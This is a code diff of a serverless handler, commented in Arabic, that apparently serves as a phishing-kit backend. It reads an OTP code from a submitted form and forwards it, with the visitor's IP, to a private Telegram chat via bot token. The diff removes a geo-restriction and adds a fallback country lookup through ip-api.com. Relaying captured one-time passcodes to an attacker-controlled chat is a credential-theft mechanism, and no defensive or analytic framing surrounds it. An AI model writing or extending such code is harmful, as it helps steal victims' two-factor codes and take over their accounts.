@@ -1,7 +1,5 @@
 const fetch = require('node-fetch');
 
-// تم إزالة قيد ALLOWED_COUNTRIES (إلغاء الحظر الجغرافي)
-
 const getClientIp = (headers) => {
     return headers['x-nf-client-connection-ip'] || 
            headers['client-ip'] || 
@@ -25,14 +23,25 @@ exports.handler = async (event, context) => {
     }
     
     const ip = getClientIp(event.headers); 
-    const countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; // سنظل نسجل البلد في الرسالة
+    let countryCode = event.headers['x-nf-client-country'] || 'غير متوفر'; 
+    
+    // **آلية جلب رمز البلد الاحتياطية (FallBack)**
+    if (countryCode === 'غير متوفر' && ip !== 'غير متوفر') {
+        try {
+            const geoApiUrl = `http://ip-api.com/json/${ip}?fields=countryCode`;
+            const geoResponse = await fetch(geoApiUrl);
+            const geoData = await geoResponse.json();
+
+            if (geoResponse.ok && geoData.countryCode) {
+                countryCode = geoData.countryCode; 
+            }
+        } catch (e) {
+            console.error("Error fetching geo location from API:", e);
+        }
+    }
     
     // ----------------------------------------------------------------
-    // 1. **(تم إزالة فحص Geo-Restriction بالكامل)**
-    // ----------------------------------------------------------------
-    
-    // ----------------------------------------------------------------
-    // 2. معالجة OTP (الزوار المسموح لهم)
+    // 2. معالجة OTP 
     // ----------------------------------------------------------------
     
     const bodyParams = new URLSearchParams(event.body);
@@ -46,10 +55,10 @@ exports.handler = async (event, context) => {
     const safe_ip = escapeMarkdownV2(ip);
     const safe_country = escapeMarkdownV2(countryCode);
 
+    // تشكيل الرسالة (تم حذف سطر Country)
     let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
-    message_text += `Country: \`${safe_country}\`\n`; // ما زلنا نسجل البلد للتشخيص
     message_text += `OTP Code: \`${safe_otp}\`\n`;
-    message_text += `IP: \`${safe_ip}\``; 
+    message_text += `IP: \`${safe_ip}\``; // <--- تم تعديل هذا السطر
 
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
